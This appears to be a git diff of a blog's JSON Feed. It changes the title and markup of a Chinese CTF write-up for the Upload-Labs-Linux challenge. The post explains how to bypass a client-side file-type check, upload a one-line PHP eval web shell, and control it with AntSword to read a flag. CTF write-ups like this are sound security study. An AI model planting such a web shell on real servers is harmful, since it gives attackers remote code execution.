@@ -1,6 +1,6 @@
 {
     "version": "https://jsonfeed.org/version/1",
-    "title": "MAXshiro's Blog • All posts by \"buuctf\" tag",
+    "title": "MAXshiro • All posts by \"buuctf\" tag",
     "description": "Discover and Record the world.",
     "home_page_url": "http://maxshiroi.top",
     "items": [
@@ -9,7 +9,7 @@
             "url": "http://maxshiroi.top/ug/085248/",
             "title": "CTF：Upload-Labs-Linux",
             "date_published": "2022-10-10T00:52:48.000Z",
-            "content_html": "<h1 id=\"题目预览\"><a class=\"markdownIt-Anchor\" href=\"#题目预览\">#</a> 题目预览：</h1>\n<p><img src=\"/img/Upload-Labs-Linux/20221010085420.png\" alt=\"\"></p>\n<h1 id=\"解决方法\"><a class=\"markdownIt-Anchor\" href=\"#解决方法\">#</a> 解决方法</h1>\n<ol>\n<li>开控制台</li>\n<li>关闭 javascript\n<blockquote>\n<p>设置 - 偏好设置 - 调试程序<br>\n删除 <code>onsubmit=\"return.checkFile()\"</code></p>\n</blockquote>\n</li>\n<li>新建一个文件里面写入 <code>&lt;?php @eval($_POST['123']);?&gt;</code></li>\n<li>后缀名改为 php 上传到网站，显示出图片后右键复制链接。</li>\n<li>打开 antsword，add 一个 url 地址为图片链接，密码为 123，加密 base64.</li>\n<li>点击链接就能发现根目录有个 flag 文件了。</li>\n</ol>\n",
+            "content_html": "<h1 id=\"题目预览\"><a class=\"anchor\" href=\"#题目预览\">#</a> 题目预览：</h1>\n<div class=\"tag-plugin image\"><div class=\"image-bg\"><img src=\"/img/Upload-Labs-Linux/20221010085420.png\" fancybox=\"true\"></div></div>  \n<h1 id=\"解决方法\"><a class=\"anchor\" href=\"#解决方法\">#</a> 解决方法</h1>\n<ol>\n<li>开控制台</li>\n<li>关闭 javascript\n<blockquote>\n<p>设置 - 偏好设置 - 调试程序<br>\n删除 <code>onsubmit=\"return.checkFile()\"</code></p>\n</blockquote>\n</li>\n<li>新建一个文件里面写入 <code>&lt;?php @eval($_POST['123']);?&gt;</code></li>\n<li>后缀名改为 php 上传到网站，显示出图片后右键复制链接。</li>\n<li>打开 antsword，add 一个 url 地址为图片链接，密码为 123，加密 base64.</li>\n<li>点击链接就能发现根目录有个 flag 文件了。</li>\n</ol>\n",
             "tags": [
                 "ctf",
                 "buuctf",
